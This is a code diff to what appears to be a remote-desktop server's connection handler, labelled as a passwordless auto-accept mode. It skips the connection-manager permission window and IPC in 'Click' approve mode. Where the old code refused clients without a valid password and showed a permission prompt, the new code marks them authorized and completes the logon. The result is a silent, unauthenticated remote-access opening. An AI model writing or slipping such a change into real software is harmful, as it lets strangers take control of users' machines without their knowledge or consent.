@@ -1748,6 +1748,12 @@ impl Connection {
     }
 
     fn try_start_cm(&mut self, peer_id: String, name: String, authorized: bool) {
+        // Skip CM completely for passwordless auto-accept mode
+        if password::approve_mode() == password::ApproveMode::Click {
+            log::info!("Skipping CM window - passwordless auto-accept mode enabled");
+            return;
+        }
+        
         self.send_to_cm(ipc::Data::Login {
             id: self.inner.id(),
             is_file_transfer: self.file_transfer.is_some(),
@@ -1965,6 +1971,12 @@ impl Connection {
 
     #[cfg(not(any(target_os = "android", target_os = "ios")))]
     fn try_start_cm_ipc(&mut self) {
+        // Skip CM IPC completely for passwordless auto-accept mode
+        if password::approve_mode() == password::ApproveMode::Click {
+            log::info!("Skipping CM IPC - passwordless auto-accept mode enabled");
+            return;
+        }
+        
         if let Some(p) = self.start_cm_ipc_para.take() {
             tokio::spawn(async move {
                 #[cfg(windows)]
@@ -2183,14 +2195,15 @@ impl Connection {
                     && is_logon()))
                 || password::approve_mode() == ApproveMode::Both && !password::has_valid_password()
             {
-                self.try_start_cm(lr.my_id, lr.my_name, false);
-                if hbb_common::get_version_number(&lr.version)
-                    >= hbb_common::get_version_number("1.2.0")
-                {
-                    self.send_login_error(crate::client::LOGIN_MSG_NO_PASSWORD_ACCESS)
-                        .await;
-                }
-                return true;
+                // Auto-accept passwordless connections without showing permission window
+                log::info!("Auto-accepting passwordless connection from: {}", lr.my_id);
+                self.authorized = true;
+                #[cfg(target_os = "linux")]
+                self.linux_headless_handle.wait_desktop_cm_ready().await;
+                self.send_logon_response().await;
+                // Start CM in background but with authorized = true (no permission prompt)
+                self.try_start_cm(lr.my_id, lr.my_name, true);
+                return false; // Continue with connection
             } else if self.is_recent_session(false) {
                 if err_msg.is_empty() {
                     #[cfg(target_os = "linux")]
